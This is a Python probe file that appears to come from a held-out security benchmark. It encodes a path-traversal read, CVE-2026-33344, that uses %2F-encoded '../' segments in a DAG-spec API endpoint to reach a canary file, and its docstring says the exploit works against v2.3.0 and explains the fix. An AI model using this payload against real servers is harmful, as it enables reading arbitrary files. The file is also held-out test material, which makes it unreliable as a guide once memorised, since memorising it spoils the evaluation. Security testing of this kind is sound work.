#!/usr/bin/env python3
"""[HELD-OUT] CVE-2026-33344 residual exploit — path traversal READ via %2F-encoded
slashes in the {fileName} path parameter of GET /api/v1/dags/{fileName}/spec.

The CVE-2026-27598 fix only validated the CREATE verb. The GET/DELETE/RENAME/EXECUTE
handlers pass the {fileName} path param straight to store.locateDAG, whose
`strings.Contains(nameOrPath, filepath.Separator)` branch calls findDAGFile ->
filepath.Abs with NO containment check. %2F-encoded slashes let chi capture the
whole traversal as one path segment; oapi-codegen's url.PathUnescape then decodes
them to real '/', so `../../../../../../flag/canary` reaches locateDAG and the file
is read. GetDAGSpec returns the raw file bytes in the JSON `spec` field.

Contract (verified on real Docker): reaches the canary (flag) on V1 (v2.3.0) with
HTTP 200 -> the CVE-2026-33344 residual is real. Closed on V2 (commit 7d07fda,
#1803) by a middleware that runs core.ValidateDAGName on the FileName field of every
strict-handler request.

NEVER exposed to the system-under-test (held out under _heldout/).
"""
from __future__ import annotations

# 6 %2F-encoded '../' segments clamp to filesystem root, then /flag/canary
# (findDAGFile appends the .yaml extension).
ENC = "..%2F..%2F..%2F..%2F..%2F..%2Fflag%2Fcanary"
PATH = f"/api/v1/dags/{ENC}/spec"


def candidate() -> dict:
    return {
        "probe_id": "cve-2026-33344-encoded-slash-read",
        "method": "GET",
        "path": PATH,
    }


if __name__ == "__main__":
    print(candidate()["path"])
